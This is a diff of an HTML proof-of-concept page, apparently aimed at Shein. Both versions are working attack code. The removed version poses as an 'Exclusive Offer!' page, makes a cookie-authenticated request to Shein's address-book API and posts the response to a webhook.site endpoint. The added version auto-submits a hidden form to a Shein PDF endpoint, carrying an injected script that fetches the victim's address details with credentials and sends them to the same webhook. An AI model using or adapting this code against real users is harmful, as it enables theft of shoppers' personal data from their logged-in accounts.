@@ -1,34 +1,10 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Special Offer Page</title>
-</head>
+<html>
 <body>
-    <h1>Exclusive Offer!</h1>
-    <p>If you're logged into Shein, your sensitive data could be exposed!</p>
-    <script>
-        // Malicious script that automatically runs when the victim visits the page
-        var req = new XMLHttpRequest();
-        req.onload = function() {
-            console.log("Response from Shein API:", this.responseText);
-
-            // Send the response data (stolen data) to a webhook or attacker-controlled endpoint
-            var exfiltrationRequest = new XMLHttpRequest();
-            exfiltrationRequest.open('POST', 'https://cors-anywhere.herokuapp.com/https://webhook.site/afa8e098-cdf4-4c25-8230-2abe0bddd66f', true); // Using CORS proxy and Webhook
-            exfiltrationRequest.setRequestHeader('Content-Type', 'application/json');
-            exfiltrationRequest.send(JSON.stringify({ data: this.responseText })); // Send stolen data to webhook
-        };
-
-        // Make the GET request to Shein's API with valid address_id (update address_id with valid one)
-        req.open('GET', 'https://www.shein.co.uk/bff-api/user-api/addressbook/address_detail?_ver=1.1.8&_lang=en&address_id=1968530439&scene=0', true);
-
-        // Include credentials (cookies) for authentication
-        req.withCredentials = true;  // Sends the victim’s authentication cookies with the request
-
-        // Send the request to Shein’s API
-        req.send();
-    </script>
+<h1>Loading...</h1>
+<form id="f" action="https://pdf.shein.com/html" method="POST">
+<input name="content" value='<script>fetch("https://www.shein.co.uk/bff-api/user-api/addressbook/address_detail?_ver=1.1.8&_lang=en&address_id=1968768724&scene=0",{credentials:"include"}).then(r=>r.text()).then(d=>{fetch("https://webhook.site/afa8e098-cdf4-4c25-8230-2abe0bddd66f",{method:"POST",body:d})})</script>'>
+</form>
+<script>document.getElementById("f").submit();</script>
 </body>
 </html>
